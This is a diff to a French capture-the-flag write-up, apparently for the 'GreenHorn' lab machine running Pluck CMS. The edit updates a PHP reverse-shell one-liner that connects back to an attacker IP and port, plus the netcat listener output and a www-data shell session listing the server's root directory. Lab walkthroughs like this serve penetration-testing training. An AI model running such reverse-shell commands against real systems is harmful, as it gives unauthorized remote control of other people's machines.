@@ -279,7 +279,7 @@ Notre shell est donc `/usr/sbin/nologin`. Cela signifie que nous serons trop lim
 
 Puisque pluck est un CMS codé en php, on tente de créer un deuxième reverse shell avec php pour échapper le premier:
 ```php
-php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 Il ne faut pas oublier de démarrer netcat sur notre machine:
@@ -290,41 +290,47 @@ nc -lvnp 5555
 La connexion est établie:
 ```bash
 listening on [any] 5555 ...
-connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 48630
-/bin/sh: 0: can't access tty; job control turned off
-$
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.25] 41880
+bash: cannot set terminal process group (1114): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@greenhorn:~/html/pluck$ 
 ```
 
 Une fois la connexion établie, on tente de naviguer dans le serveur avec le nouveau shell:
 ```bash
-$ pwd
-/var/www/html/pluck
-$ cd /
-$ ls
-bin
-boot
-cdrom
-data
-dev
-etc
-home
-lib
-lib32
-lib64
-libx32
-lost+found
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
-usr
-var
+www-data@greenhorn:~/html/pluck$ cd /
+cd /
+www-data@greenhorn:/$ ls -la
+ls -la
+total 76
+drwxr-xr-x  20 root root  4096 Jun 20 07:06 .
+drwxr-xr-x  20 root root  4096 Jun 20 07:06 ..
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Jul 15 05:51 boot
+dr-xr-xr-x   2 root root  4096 Jun 20 06:36 cdrom
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 data
+drwxr-xr-x  20 root root  4020 Jul 25 02:41 dev
+drwxr-xr-x 107 root root  4096 Jul 15 05:42 etc
+drwxr-xr-x   4 root root  4096 Jun 20 06:36 home
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 10 23:33 lost+found
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 media
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 mnt
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 opt
+dr-xr-xr-x 292 root root     0 Jul 25 02:41 proc
+drwx------   5 root root  4096 Jul 25 02:48 root
+drwxr-xr-x  28 root root   820 Jul 25 03:03 run
+lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Jun 20 06:36 srv
+dr-xr-xr-x  13 root root     0 Jul 25 02:41 sys
+drwxrwxrwt  12 root root  4096 Jul 25 02:55 tmp
+drwxr-xr-x  14 root root  4096 Jun 20 06:36 usr
+drwxr-xr-x  13 root root  4096 Jun 20 06:36 var
+www-data@greenhorn:/$ 
+
 ```
 
 
